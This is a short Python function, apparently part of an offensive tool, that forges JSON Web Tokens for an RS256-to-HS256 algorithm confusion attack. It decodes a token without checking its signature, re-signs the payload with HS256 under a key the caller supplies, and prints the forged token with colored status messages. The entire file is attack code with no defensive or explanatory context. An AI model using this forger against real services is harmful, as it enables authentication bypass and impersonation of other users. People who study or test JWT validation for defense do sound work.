import jwt
from colorama import Fore

def confuse_algorithm(original_token, fake_secret):
    try:
        payload = jwt.decode(original_token, options={"verify_signature": False})
        forged = jwt.encode(payload, key=fake_secret, algorithm="HS256")
        print(Fore.GREEN + "[+] JWT Algorithm Confusion (RS256 -> HS256) forged:")
        print(forged)
        return forged
    except Exception as e:
        print(Fore.RED + f"[-] Confusion attempt failed: {str(e)}")
